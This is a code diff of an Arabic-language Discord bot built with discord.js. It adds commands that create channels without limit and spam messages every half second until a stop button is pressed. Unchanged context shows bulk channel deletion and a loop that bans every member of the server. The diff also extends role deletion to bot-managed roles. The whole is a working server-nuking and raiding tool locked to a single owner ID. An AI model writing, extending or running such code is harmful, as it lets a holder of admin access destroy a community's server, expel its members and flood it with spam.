@@ -1,8 +1,8 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, ChannelType, REST, Routes } = require('discord.js');
+const { Client, GatewayIntentBits, SlashCommandBuilder, PermissionFlagsBits, ChannelType, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const OWNER_ID = '1452136095788564614'; // ID المالك فقط
+const OWNER_ID = '1452136095788564614';
 
 const client = new Client({
     intents: [
@@ -11,6 +11,9 @@ const client = new Client({
         GatewayIntentBits.GuildMessages,
     ]
 });
+
+// لتتبع العمليات الجارية
+const activeOperations = new Map();
 
 // ===== تسجيل الأوامر =====
 const commands = [
@@ -21,7 +24,7 @@ const commands = [
 
     new SlashCommandBuilder()
         .setName('add-room')
-        .setDescription('إضافة روم جديد')
+        .setDescription('إضافة روومات بشكل مستمر مع زر إيقاف')
         .addStringOption(option =>
             option.setName('name')
                 .setDescription('اسم الروم')
@@ -29,6 +32,23 @@ const commands = [
         .addStringOption(option =>
             option.setName('message')
                 .setDescription('الرسالة التي تُرسل في الروم')
+                .setRequired(false))
+        .addIntegerOption(option =>
+            option.setName('count')
+                .setDescription('عدد الروومات (اتركه فارغ للسبام المستمر)')
+                .setRequired(false))
+        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
+
+    new SlashCommandBuilder()
+        .setName('spam')
+        .setDescription('إرسال رسالة بشكل مستمر مع زر إيقاف')
+        .addStringOption(option =>
+            option.setName('message')
+                .setDescription('الرسالة المراد إرسالها')
+                .setRequired(true))
+        .addChannelOption(option =>
+            option.setName('channel')
+                .setDescription('الروم المراد الإرسال فيه')
                 .setRequired(false))
         .setDefaultMemberPermissions(PermissionFlagsBits.Administrator),
 
@@ -95,9 +115,23 @@ client.once('ready', async () => {
 
 // ===== معالجة الأوامر =====
 client.on('interactionCreate', async (interaction) => {
+
+    // ===== معالجة الأزرار =====
+    if (interaction.isButton()) {
+        if (interaction.user.id !== OWNER_ID) {
+            return interaction.reply({ content: '❌ ليس لديك صلاحية.', ephemeral: true });
+        }
+
+        const opId = interaction.customId.replace('stop_', '');
+        if (activeOperations.has(opId)) {
+            activeOperations.set(opId, false);
+            await interaction.update({ content: '🛑 تم إيقاف العملية!', components: [] });
+        }
+        return;
+    }
+
     if (!interaction.isChatInputCommand()) return;
 
-    // التحقق من المالك
     if (interaction.user.id !== OWNER_ID) {
         return interaction.reply({ content: '❌ هذا البوت خاص ولا يمكنك استخدامه.', ephemeral: true });
     }
@@ -118,26 +152,79 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.editReply(`✅ تم حذف **${deleted}** روم بنجاح.`);
     }
 
-    // ===== إضافة روم =====
+    // ===== إضافة روم / سبام روومات =====
     else if (commandName === 'add-room') {
-        await interaction.deferReply({ ephemeral: true });
         const name = interaction.options.getString('name');
         const message = interaction.options.getString('message');
+        const count = interaction.options.getInteger('count');
 
-        try {
-            const channel = await interaction.guild.channels.create({
-                name: name,
-                type: ChannelType.GuildText,
-            });
+        const opId = `addroom_${interaction.id}`;
+        activeOperations.set(opId, true);
 
-            if (message) {
-                await channel.send(message);
+        const stopButton = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`stop_${opId}`)
+                .setLabel('🛑 إيقاف')
+                .setStyle(ButtonStyle.Danger)
+        );
+
+        await interaction.reply({ content: `⚙️ جاري إنشاء الروومات...`, components: [stopButton], ephemeral: true });
+
+        let created = 0;
+        const limit = count || Infinity;
+
+        while (activeOperations.get(opId) && created < limit) {
+            try {
+                const channel = await interaction.guild.channels.create({
+                    name: name,
+                    type: ChannelType.GuildText,
+                });
+                if (message) await channel.send(message);
+                created++;
+            } catch (e) {
+                break;
             }
-
-            await interaction.editReply(`✅ تم إنشاء الروم **${name}** بنجاح!`);
-        } catch (e) {
-            await interaction.editReply(`❌ فشل إنشاء الروم: ${e.message}`);
+            await new Promise(r => setTimeout(r, 500));
         }
+
+        activeOperations.delete(opId);
+        try {
+            await interaction.editReply({ content: `✅ تم إنشاء **${created}** روم.`, components: [] });
+        } catch (e) {}
+    }
+
+    // ===== سبام رسائل =====
+    else if (commandName === 'spam') {
+        const message = interaction.options.getString('message');
+        const channel = interaction.options.getChannel('channel') || interaction.channel;
+
+        const opId = `spam_${interaction.id}`;
+        activeOperations.set(opId, true);
+
+        const stopButton = new ActionRowBuilder().addComponents(
+            new ButtonBuilder()
+                .setCustomId(`stop_${opId}`)
+                .setLabel('🛑 إيقاف')
+                .setStyle(ButtonStyle.Danger)
+        );
+
+        await interaction.reply({ content: `⚙️ جاري إرسال الرسائل في <#${channel.id}>...`, components: [stopButton], ephemeral: true });
+
+        let sent = 0;
+        while (activeOperations.get(opId)) {
+            try {
+                await channel.send(message);
+                sent++;
+            } catch (e) {
+                break;
+            }
+            await new Promise(r => setTimeout(r, 500));
+        }
+
+        activeOperations.delete(opId);
+        try {
+            await interaction.editReply({ content: `✅ تم إرسال **${sent}** رسالة.`, components: [] });
+        } catch (e) {}
     }
 
     // ===== باند =====
@@ -167,8 +254,8 @@ client.on('interactionCreate', async (interaction) => {
             const members = await interaction.guild.members.fetch();
             let banned = 0;
             for (const member of members.values()) {
-                if (member.id === interaction.user.id) continue; // لا يبان نفسه
-                if (member.id === client.user.id) continue; // لا يبان البوت
+                if (member.id === interaction.user.id) continue;
+                if (member.id === client.user.id) continue;
                 try {
                     await member.ban({ reason });
                     banned++;
@@ -184,7 +271,7 @@ client.on('interactionCreate', async (interaction) => {
     else if (commandName === 'delete-roles') {
         await interaction.deferReply({ ephemeral: true });
         const reason = interaction.options.getString('reason') ?? 'لا يوجد سبب';
-        const roles = interaction.guild.roles.cache.filter(r => !r.managed && r.name !== '@everyone');
+        const roles = interaction.guild.roles.cache.filter(r => r.name !== '@everyone');
         let deleted = 0;
         for (const role of roles.values()) {
             try {
